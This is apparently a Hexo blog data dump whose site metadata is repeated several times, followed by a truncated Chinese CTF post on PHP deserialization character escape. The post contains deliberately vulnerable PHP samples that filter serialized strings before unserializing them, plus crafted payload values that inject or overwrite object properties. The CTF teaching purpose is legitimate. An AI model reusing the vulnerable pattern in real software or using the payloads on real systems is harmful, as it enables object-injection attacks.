title=\"畅所欲言\"></a>畅所欲言</h2><hr>\n<p>在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！</p>\n<h2 id=\"友链\"><a href=\"#友链\" class=\"headerlink\" title=\"友链\"></a>友链</h2><hr>\n<p>Liloong3tの友链信息</p>\n<p>博客名称: Liloong3tの博客</p>\n<p>博客网址: <a href=\"https://liloong3t.com\">https://liloong3t.com</a></p>\n<p>博客介绍: 千里之行，始于足下！</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h2 id=\"畅所欲言\"><a href=\"#畅所欲言\" class=\"headerlink\" title=\"畅所欲言\"></a>畅所欲言</h2><hr>\n<p>在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！</p>\n<h2 id=\"友链\"><a href=\"#友链\" class=\"headerlink\" title=\"友链\"></a>友链</h2><hr>\n<p>Liloong3tの友链信息</p>\n<p>博客名称: Liloong3tの博客</p>\n<p>博客网址: <a href=\"https://liloong3t.com\">https://liloong3t.com</a></p>\n<p>博客介绍: 千里之行，始于足下！</p>\n"},{"title":"friends","date":"2019-07-19T08:42:10.000Z","type":"friends","layout":"friends","_content":"","source":"friends/index.md","raw":"---\ntitle: friends\ndate: 2019-07-19 16:42:10\ntype: \"friends\"\nlayout: \"friends\"\n---","updated":"2020-07-01T09:09:44.000Z","path":"friends/index.html","comments":1,"_id":"ckkntx9jf000fxov7mxz6cd6w","content":"<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":""},{"title":"相册","layout":"galleries","_content":"","source":"galleries/index.md","raw":"---\ntitle: 相册\nlayout: \"galleries\"\n---\n","date":"2021-02-01T09:13:25.987Z","updated":"2020-07-01T09:09:44.000Z","path":"galleries/index.html","comments":1,"_id":"ckkntx9m0005hxov71etddv7o","content":"<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":""},{"title":"tags","date":"2019-07-19T08:40:27.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2019-07-19 16:40:27\ntype: \"tags\"\nlayout: \"tags\"\n---","updated":"2020-07-01T09:09:44.000Z","path":"tags/index.html","comments":1,"_id":"ckkntx9m1005ixov7ohpolsru","content":"<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":""},{"title":"背景图片3","type":"gallery","layout":"gallery","_content":"\n\n\n","source":"galleries/背景图片3/index.md","raw":"---\ntitle: 背景图片3\ntype: \"gallery\"\nlayout: \"gallery\"\n---\n\n\n\n","date":"2021-02-01T09:13:44.962Z","updated":"2020-07-01T09:09:44.000Z","path":"galleries/背景图片3/index.html","comments":1,"_id":"ckkntx9mg005jxov70gjzl82u","content":"<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":""},{"title":"背景图片4","type":"gallery","layout":"gallery","_content":"\n\n\n","source":"galleries/背景图片4/index.md","raw":"---\ntitle: 背景图片4\ntype: \"gallery\"\nlayout: \"gallery\"\n---\n\n\n\n","date":"2021-02-01T09:14:15.019Z","updated":"2020-07-01T09:09:44.000Z","path":"galleries/背景图片4/index.html","comments":1,"_id":"ckkntx9n7005kxov7llvv0wbw","content":"<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":""}],"Post":[{"layout":"post","title":"php反序列化字符逃逸","date":"2020-09-20T16:00:00.000Z","description":"我好想逃，却逃不掉","_content":"\n\n\n# PHP反序列化字符逃逸\n\n\n\n读题目源码的时候，一旦看到\"serialize()\"和\"replace\"(比如str_replace(),preg_replace()等)，就基本可以开始往反序列化逃逸的方向考虑了\n反序列化字符逃逸都大同小异，基本可以分为“替换后字符串变长”和“替换后字符串变短的\n\n其核心原理都是利用替换后变长或变短的字符串“顶出”后一个属性并将payload替换进去，或“吞并”后一个属性值的一部分，使我们在后一个属性中构建的payload成为我们想要的属性\n## 替换之后字符串变长\n示例代码:\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res=filter(serialize($AA));\n\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\n上面这段代码中的filter()函数，会将传入的字符串 $str 中的'bb'替换为'ccc'，替换后字符串变长\n\n其后对$AA进行序列化然后调用了这个filter函数并反序列化输出，这就构成了一个反序列化字符逃逸漏洞\n\n如果这时我们有办法构造payload更改$AA中的内容，便可以利用这个漏洞，因为只要$name或$pass属性中每多一对'bb'字符，便会使之后的$res中字符多一个\n\n而unserialize函数读取序列化字符串时，是通过s:所指定的长度和;\"}来判断一个属性的结束的，这二者缺一不可，如果没有s所指定的长度，unserialize()就会在读到;\"}时结束一个属性的读取，也就是如果属性的值中有;\"}，就可以直接“骗”过它，让它认为这段字符串结束了，但一般来说，s指定了字符串的长度让它不会轻易“受骗”。\n\n但filter函数给了我们一个“戏弄”它的机会，因为每个'bb'字符串都会使最终的字符串长度多一位，让实际的字符串比s所记录的长一位。仅仅只长一位没什么，php会报错，但如果在'bb'字符串后面的内容是\";}呢？如果name的内容是\"bbbbbb\";}\",则序列化后，s的值为9，在被filter函数过滤后为\"ccccccccc\";}\",那么因为s为9，unserialize函数只会读到最后一个'c'处,由于后面是;\"}，它便会认为这串字符结束了。\n\n这便是反序列化字符逃逸的基本原理了，利用这种方式，我们就能任意构造name属性后面的内容，比如更改pass的内容，甚至添加一个“本不应该存在的属性”。如：构造name=“bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:11:\"Hello,world\";}“, 这里面有33个'bb', 紧跟其后的\";s:11:\"Hello,world\";}也是33个字符，这样经过filter函数替换后,多出来的33个'c'会“顶”掉后面的\";s:4:\"pass\";s:11:\"Hello,world\";}，并使后者被当作pass属性读入，这样，最终name的值为33个'ccc'，而pass的值就变为Hello,world\n\n## 替换后字符变短\n\n这种情况和上面那种大同小异，核心原理都是一样的，“替换后字符串长度改变，在字符串中构造payload”。唯一不同的大概是，上面这种payload构造在被替换的字符串里面，这种的payload构造在下一个属性的字符串里面\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bbb', 'cc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res=filter(serialize($AA));\n\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\n还是这串代码，不同的地方仅仅是从用'ccc'替换'bb'变成了用'cc'替换'bbb' \n\n这时，构造name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,pass=123456\";s:5:\"pass2\";s:5:\"Hello\";}\n\n这里面有24个'bbb'，经过filter后会缩短24个字符，刚好可以包裹 \";s:4:\"pass\";s:6:\"123456 这一段，于是后一段\";s:5:\"pass2\";s:5:\"Hello\";}就被当作另一个属性被读进去了，这样我们又能更改本来不能更改的属性的内容甚至添加属性了\n\n反序列化字符逃逸的应用条件十分苛刻，一般只有比赛的时候用的上，但终归是一种漏洞，其基本原理就在这里了","source":"_posts/2020-09-20-php反序列化字符逃逸.md","raw":"---\nlayout: post\ntitle: php反序列化字符逃逸\ndate: 2020-9-21\ncategories: blog\ntags: [CTF,php字符反序列化]\ndescription: 我好想逃，却逃不掉\n---\n\n\n\n# PHP反序列化字符逃逸\n\n\n\n读题目源码的时候，一旦看到\"serialize()\"和\"replace\"(比如str_replace(),preg_replace()等)，就基本可以开始往反序列化逃逸的方向考虑了\n反序列化字符逃逸都大同小异，基本可以分为“替换后字符串变长”和“替换后字符串变短的\n\n其核心原理都是利用替换后变长或变短的字符串“顶出”后一个属性并将payload替换进去，或“吞并”后一个属性值的一部分，使我们在后一个属性中构建的payload成为我们想要的属性\n## 替换之后字符串变长\n示例代码:\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res=filter(serialize($AA));\n\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\n上面这段代码中的filter()函数，会将传入的字符串 $str 